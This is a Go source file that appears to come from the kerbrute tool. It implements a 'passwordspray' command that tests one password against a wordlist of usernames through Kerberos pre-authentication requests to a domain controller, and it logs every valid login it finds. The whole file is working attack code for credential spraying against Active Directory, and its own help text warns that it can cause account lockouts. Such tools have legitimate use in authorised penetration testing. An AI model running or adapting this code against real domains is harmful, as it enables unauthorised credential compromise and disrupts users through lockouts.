package cmd

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/ropnop/kerbrute/session"
	"github.com/spf13/cobra"
)

var usernameList string
var password string

var passwordSprayCmd = &cobra.Command{
	Use:   "passwordspray [flags] <username_wordlist> <password>",
	Short: "Test a single password against a list of users",
	Long: `Will perform a password spray attack against a list of users using Kerberos Pre-Authentication by requesting a TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
Succesful logins will be displayed on stdout.
WARNING: use with caution - failed Kerberos pre-auth can cause account lockouts`,
	Args: cobra.ExactArgs(2),
	Run:  passwordSpray,
}

func init() {
	rootCmd.AddCommand(passwordSprayCmd)
}

func passwordSpray(cmd *cobra.Command, args []string) {
	usernamelist := args[0]
	password := args[1]
	domain, _ := cmd.Flags().GetString("domain")
	domainController, _ := cmd.Flags().GetString("dc")
	verbose, _ := cmd.Flags().GetBool("verbose")
	safe, _ := cmd.Flags().GetBool("safe")

	kSession := session.NewKerbruteSession(domain, domainController, verbose, safe)

	log.Println("Using KDC(s):")
	for _, v := range kSession.Kdcs {
		log.Printf("\t%s\n", v)
	}

	file, err := os.Open(usernamelist)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	var username string
	count := 0
	start := time.Now()
	for scanner.Scan() {
		count++
		username = scanner.Text()
		login := fmt.Sprintf("%v@%v", username, domain)
		if ok, err := kSession.TestLogin(username, password); ok {
			log.Printf("[+] VALID LOGIN:\t %s : %s", login, password)
		} else {
			// This is to determine if the error is "okay" or if we should abort everything
			if ok, errorString := kSession.HandleKerbError(err); !ok {
				log.Printf("[!] %v :\t %v", login, errorString)
				return
			} else if kSession.Verbose {
				log.Printf("[!] %v :\t %v", login, errorString)
			}
		}
	}
	log.Println("...done!")
	log.Printf("Tested %d logins in %.3f seconds", count, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

}
